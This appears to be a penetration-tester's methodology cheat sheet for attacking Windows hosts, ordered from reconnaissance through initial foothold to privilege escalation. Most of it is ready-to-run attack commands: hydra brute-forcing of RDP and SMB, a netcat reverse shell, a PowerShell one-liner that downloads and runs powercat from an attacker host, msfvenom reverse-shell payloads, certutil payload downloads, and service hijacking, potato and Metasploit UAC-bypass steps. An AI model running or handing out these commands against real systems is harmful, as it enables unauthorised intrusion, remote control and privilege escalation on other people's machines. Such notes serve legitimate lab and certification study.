# Windows Methodology

Part of [[METHODOLOGY CHEAT SHEET]]. Recon → SMB/LDAP enumeration → shells → privilege escalation, phase-ordered.

---

### Phase 1: Reconnaissance

#### Step 1: Port Scanning
```bash
nmap -v -sS -sV -Pn --top-ports 1000 -oA nmap_quick <target>
nmap -sT -p- --min-rate 5000 --max-retries 1 -oA nmap_full <target>
```

**What to look for**:
- SMB (139, 445) - file shares, SMB exploits
- RDP (3389) - remote desktop
- WinRM (5985, 5986) - remote management
- MSSQL (1433) - default credentials
- Web (80, 443, 8080)
- NetBIOS (137-139)

#### Step 2: SMB Enumeration
```bash
enum4linux <target>
smbclient -U guest -L //<target>

# SMB vulnerability scan
nmap -v -sS -p 445,139 -Pn --script smb-vuln* --script-args=unsafe=1 <target>
```

**What to look for**:
- Shares (non-default names)
- Users (via enum4linux)
- Null sessions (SMB signing disabled)
- SMB vulnerabilities (EternalBlue, SMBGhost)

#### Step 3: Web Enumeration
```bash
gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt -x aspx,asp,txt,config
```

#### Step 4: LDAP/DNS Enumeration
```bash
# DNS zone transfer
host -l domain.com <target>
nslookup
> server <target>
> ls -d domain.com

# LDAP
ldapsearch -x -H ldap://<target> -b "dc=domain,dc=com"
```

---

### Phase 2: Initial Foothold

#### Step 1: Service Exploitation
```bash
# SMB exploits
searchsploit smb
# Try EternalBlue, SMBGhost, etc.

# Weak credentials
hydra -L users.txt -P rockyou.txt rdp://<target> -t 1
hydra -L users.txt -P rockyou.txt smb://<target> -t 4

# Web vulnerabilities
searchsploit <software> <version>
```

#### Step 2: Shells & Payloads

**Netcat**:
```cmd
nc <attacker_ip> 4444 -e cmd.exe
```

**PowerShell**:
```powershell
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<attacker_ip>/powercat.ps1'); powercat -c <attacker_ip> -p 4444 -e powershell"
```

**MSFVenom**:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f exe -o shell.exe

# Meterpreter
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f exe -o met.exe
```

#### Step 3: File Transfer
```powershell
# PowerShell
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://<attacker_ip>/shell.exe', 'C:\temp\shell.exe')"

# Certutil
certutil.exe -urlcache -f http://<attacker_ip>/shell.exe C:\temp\shell.exe

# SMB
impacket-smbserver -smb2support share /var/www/html
copy \\<attacker_ip>\share\shell.exe shell.exe
```

---

### Phase 3: Privilege Escalation

#### Step 1: Quick Enumeration
```cmd
systeminfo
hostname
whoami /all
whoami /priv
net user
net localgroup
net user username
net localgroup Administrators
ipconfig /all
route print
netstat -ano
tasklist /v
wmic qfe list
wmic product get name,version
```

#### Step 2: Automated Enumeration
```powershell
# WinPEAS
iwr -uri http://<attacker_ip>/winPEASx64.exe -Outfile winPEAS.exe
.\winPEAS.exe

# PowerUp
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')
. .\PowerUp.ps1
Invoke-AllChecks
```

#### Step 3: Common Privilege Escalation Vectors

**Unquoted Service Paths**:
```cmd
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
Get-UnquotedService  # PowerUp
```

**Service Binary Hijacking**:
```cmd
icacls "C:\Path\to\service.exe"
# If writable, replace with malicious binary
```

**DLL Hijacking**:
- Use Process Monitor to find missing DLLs
- Place malicious DLL in application directory

**Potato Attacks (SeImpersonatePrivilege)**:
```cmd
whoami /priv
# If SeImpersonatePrivilege enabled:
SweetPotato.exe -p whoami
```

**AlwaysInstallElevated**:
```powershell
Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer
Get-ItemProperty HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer
msiexec /quiet /qn /i C:\Users\Public\shell.msi
```

**UAC Bypass**:
```bash
# Metasploit
use exploit/windows/local/bypassuac_sdclt
set SESSION 1
set LHOST <attacker_ip>
run
```

**Kernel Exploits**:
```cmd
systeminfo
searchsploit windows <build_number>
```
